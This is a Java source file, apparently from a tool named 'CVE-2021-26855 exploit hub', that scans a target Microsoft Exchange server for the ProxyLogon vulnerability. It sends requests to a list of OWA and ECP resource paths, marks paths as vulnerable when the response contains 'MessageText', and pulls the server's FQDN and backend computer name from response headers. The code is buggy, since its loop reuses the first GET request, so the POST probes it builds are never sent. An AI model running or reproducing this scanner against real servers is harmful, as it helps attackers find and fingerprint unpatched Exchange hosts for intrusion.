/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.mycompany.cve_2021_26855_exploit_hub;

import java.io.IOException;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 *
 * @author Admin
 */
public class Payload {
    
    public static ArrayList<String> list_url_vuln = new ArrayList<>();
    
    public static void ScanVuln(String domain) {
        try {
            String context = Exploit.checklog.getText();
            ArrayList<String> list_uri = new ArrayList<>();
            list_uri.add("/owa/auth/Current/themes/resources/logon.css");
            list_uri.add("/owa/auth/Current/themes/resources/owafont_ja.css");
            list_uri.add("/owa/auth/Current/themes/resources/lgnbotl.gif");
            list_uri.add("/owa/auth/Current/themes/resources/owafont_ko.css");
            list_uri.add("/owa/auth/Current/themes/resources/SegoeUI-SemiBold.eot");
            list_uri.add("/owa/auth/Current/themes/resources/SegoeUI-SemiLight.ttf");
            list_uri.add("/owa/auth/Current/themes/resources/lgnbotl.gif");
            list_uri.add("/owa/auth/Current/");
            list_uri.add("/ecp/default.flt");
            list_uri.add("/ecp/main.css");
            
            String uri_check = "/owa/auth.owa";
            String domain_not_http = domain.split("//")[1];
            String FQDN_name = null;
            String computer_name = null;
            
            OkHttpClient client = new OkHttpClient().newBuilder()
                    .build();
            Request request = new Request.Builder()
                    .url(domain + uri_check)
                    .method("GET", null)
                    .addHeader("Host", domain_not_http)
                    .addHeader("Connection", "close")
                    .addHeader("sec-ch-ua", "\";Not A Brand\";v=\"99\", \"Chromium\";v=\"88\"")
                    .addHeader("sec-ch-ua-mobile", "?0")
                    .addHeader("Upgrade-Insecure-Requests", "1")
                    .addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36")
                    .addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
                    .addHeader("Sec-Fetch-Site", "none")
                    .addHeader("Sec-Fetch-Mode", "navigate")
                    .addHeader("Sec-Fetch-User", "?1")
                    .addHeader("Sec-Fetch-Dest", "document")
                    .addHeader("Accept-Encoding", "gzip, deflate")
                    .addHeader("Accept-Language", "en-US,en;q=0.9")
                    .build();
            Response response = client.newCall(request).execute();
            int status_code = response.code();
            if (status_code == 400) {
                System.out.println("Debug 1");
                context = context + "\n[-] Target is not Vuln!";
                Exploit.checklog.setText(context);
            }else{
                System.out.println("Debug 2");
                context = context + "\n[-] Scanning !";
                Exploit.checklog.setText(context);
            }
            response.body().close();
            Logger.getLogger(OkHttpClient.class.getName()).setLevel(Level.FINE);
            
            for (String u : list_uri) {
                OkHttpClient client1 = new OkHttpClient().newBuilder()
                        .build();
                MediaType mediaType1 = MediaType.parse("text/xml");
                RequestBody body1 = RequestBody.create(mediaType1, "");
                Request request1 = new Request.Builder()
                        .url(domain + u)
                        .method("POST", body1)
                        .addHeader("Host", domain_not_http)
                        .addHeader("User-Agent", "Hello-World,")
                        .addHeader("Accept-Language", "en,")
                        .addHeader("Content-Type", "text/xml")
                        .addHeader("Content-Length", "926")
                        
                        .build();
                Response response1 = client.newCall(request).execute();
                String respx = response1.body().source()+"";
                System.out.println("code: "+response1.code());
                System.out.println("body: "+respx);
                System.out.println("==============================");
                if (respx.contains("MessageText")) {
                    System.out.println("Debug 7");
                    list_url_vuln.add(domain + u);
                    context = context +"\n(+) Path " + u + " is vuln to CVE-2021-26855!";
                    Exploit.checklog.setText(context);
                    FQDN_name = response1.header("X-FEServer");
                    computer_name = response1.header("X-CalculatedBETarget");
                }else{
                    System.out.println("Debug 6");
                    context = context + "\n(+) Path " + u + " is not vuln to CVE-2021-26855!";
                    Exploit.checklog.setText(context);
                }
                response1.body().close();
                Logger.getLogger(OkHttpClient.class.getName()).setLevel(Level.FINE);
            }
            System.out.println("Debug 3");
            context = context + "\n(*) Getting Information Server";
            Exploit.checklog.setText(context);
            System.out.println("Debug 4");
            context = context +"\n(*) FQDN Name: "+FQDN_name;
            Exploit.checklog.setText(context);
            System.out.println("Debug 5");
            context = context + "\n(*) Computer Name: "+computer_name;
            Exploit.checklog.setText(context);
            
            
        } catch (IOException ex) {
            Logger.getLogger(Payload.class.getName()).log(Level.SEVERE, null, ex);
        }
        
    }
    
}
